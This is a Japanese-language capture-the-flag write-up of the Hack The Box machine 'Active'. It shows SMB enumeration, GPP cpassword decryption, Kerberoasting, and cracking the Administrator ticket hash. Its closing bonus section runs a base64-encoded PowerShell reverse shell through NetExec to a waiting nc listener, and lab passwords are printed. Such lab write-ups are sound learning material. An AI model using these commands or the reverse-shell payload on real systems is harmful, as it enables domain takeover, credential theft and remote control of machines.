---
layout: post
title: HTB Active
subtitle: Active Directory Enumeration and Exploitation
tags: [windows, easy]
---

## 列挙

### ポートスキャン

rustscan で TCP のフルポートスキャンを行う。

```bash
rustscan -a 10.129.36.197 --ulimit 5000 --timeout 4000 -- -sV -Pn -oN all-tcp.rscan -oG all-tcp.grscan
```

![image-20240521204953485](https://l3ickey.github.io/assets/img/typora-images/image-20240521204953485.png)

情報列挙の狙い目は ldap, smb あたり？ldap からドメイン名が active.htb であることが分かる。

nmap で UDP の Well-known ポートスキャンを行う。

```bash
sudo nmap -Pn -sU -T4 10.129.36.197 -oN wellknown-udp.nmap -oG wellknown-udp.gnmap
```

![image-20240521204834415](https://l3ickey.github.io/assets/img/typora-images/image-20240521204834415.png)

特に面白そうなポートは開いていない。

### SMB の列挙

enum4linux-ng で SMB の列挙を行う。

```bash
enum4linux-ng.py -A 10.129.36.197
```

![image-20240521210417356](https://l3ickey.github.io/assets/img/typora-images/image-20240521210417356.png)

Replication という名前の共有ディスクが Listing: OK になっているのでアクセスできそう。

smbclient で Replication 共有ディスク内の読み取り可能なファイルをローカルにダウンロードする。

```bash
smbclient --no-pass \\\\10.129.36.197\\Replication -p 445

smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

![image-20240521211447856](https://l3ickey.github.io/assets/img/typora-images/image-20240521211447856.png)

ダウンロードしたファイルを確認すると、DfsrPrivate, Policies, scripts というフォルダがあり、どうやら SYSVOL の複製っぽい。検証やバックアップ目的で作成した Replication 共有ディスクの権限設定をミスったのだろうか？

ダウンロードしたファイルを漁っていると、Groups.xml というファイルにユーザー名とパスワードハッシュらしきものを見つけた。

```bash
cat Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

![image-20240522171843319](https://l3ickey.github.io/assets/img/typora-images/image-20240522171843319.png)

## 足がかり

### gpp-decrypt

cpassword の復号化について調べると、gpp-decrypt というツールで復号できることがわかった。

https://www.kali.org/tools/gpp-decrypt/

> A simple ruby script that will decrypt a given GPP encrypted string.

gpp-decrypt を使って cpassword を復号化する。

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![image-20240522173421492](https://l3ickey.github.io/assets/img/typora-images/image-20240522173421492.png)

ユーザー名: active.htb\SVC_TGS
パスワード: GPPstillStandingStrong2k18

### 認証情報を使った SMB の列挙

SVC_TGS ユーザーの認証情報を使って再び SMB を列挙する。

```bash
enum4linux-ng.py -A 10.129.36.197 -u SVC_TGS -p GPPstillStandingStrong2k18
```

![image-20240522174529041](https://l3ickey.github.io/assets/img/typora-images/image-20240522174529041.png)

NETLOGON, Replication, SYSVOL, Users の共有ディスクが Listing: OK になっているのでファイルを漁ってみる。

### user.txt

Users 共有ディスクを確認すると、C:\Users であることがわかるので smbclient で Users をローカルにダウンロードし user.txt を取得する。

![image-20240522175832167](https://l3ickey.github.io/assets/img/typora-images/image-20240522175832167.png)

## 権限昇格

user.txt を取得することはできたが、shell が取れないため躓いた。shell を取ろうと NetExec の smb, wmi などを試したが、smb は SVC_TGS ユーザーに書き込み権限が無いため失敗し、wmi は SVC_TGS ユーザーに管理者権限が無いため失敗した。

### Kerberoast

実は Kerberoast を行うことで shell を取らずに権限昇格をすることができる。

まずは impacket-GetUserSPNs を使って、権限が高いユーザーで稼働しているサービスが存在するか列挙する。

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.36.197
```

![image-20240522185039995](https://l3ickey.github.io/assets/img/typora-images/image-20240522185039995.png)

Administrator ユーザーで active/CIFS:445 サービスが稼働している。

Active Directory 上で実行しているサービス（今回の場合 active/CIFS:445）は Kerberos 認証を使うことで各ユーザーがそのサービスを利用可能か検証している。Kerberos 認証にはサービスチケットが必要であり、ユーザーは Domain Controller に対してサービスチケットをリクエストすることで、サービスチケットを発行することができる。サービスチケットはサービスを実行しているユーザー（今回の場合は Administrator）のパスワードハッシュで暗号化されるため、サービスチケットに含まれる情報からサービスを実行しているユーザーのパスワードハッシュをブルートフォースによりクラックできる可能性がある。

impacket-GetUserSPNs を使って、Administrator のパスワードハッシュを入手する。

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.36.197 -request -outputfile GetUserSPNs.txt
```

![image-20240522195127169](https://l3ickey.github.io/assets/img/typora-images/image-20240522195127169.png)

ハッシュは $krb5tgs から始まるパスワードハッシュであることがわかる。

![image-20240522195416567](https://l3ickey.github.io/assets/img/typora-images/image-20240522195416567.png)

john the ripper を使って、パスワードハッシュに対して rockyou.txt のブルートフォース攻撃をする。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.txt
```

![image-20240522195631327](https://l3ickey.github.io/assets/img/typora-images/image-20240522195631327.png)

ユーザー名: Administrator
パスワード: Ticketmaster1968

### root.txt

手に入れた Administrator の認証情報を使って NetExec のコマンド実行を行う。

```bash
nxc wmi 10.129.36.197 -u Administrator -p Ticketmaster1968 -x 'type C:\Users\Administrator\Desktop\root.txt'
```

![image-20240522200120622](https://l3ickey.github.io/assets/img/typora-images/image-20240522200120622.png)

## おまけ

最後まで shell を取らなかったが、もちろん shell を取ることができる。

https://www.revshells.com/ で PowerShell #3 (Base64) のペイロードを作成する。

![image-20240522200929062](https://l3ickey.github.io/assets/img/typora-images/image-20240522200929062.png)

nc でリバースシェルを待ち受ける。

```bash
nc -nlvp 443
```

![image-20240522201042903](https://l3ickey.github.io/assets/img/typora-images/image-20240522201042903.png)

NetExec を使ってペイロードを実行する。

```bash
nxc wmi 10.129.36.197 -u Administrator -p Ticketmaster1968 -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

![image-20240522201213716](https://l3ickey.github.io/assets/img/typora-images/image-20240522201213716.png)

リバースシェルを受け取ることができる。

![image-20240522201524291](https://l3ickey.github.io/assets/img/typora-images/image-20240522201524291.png)
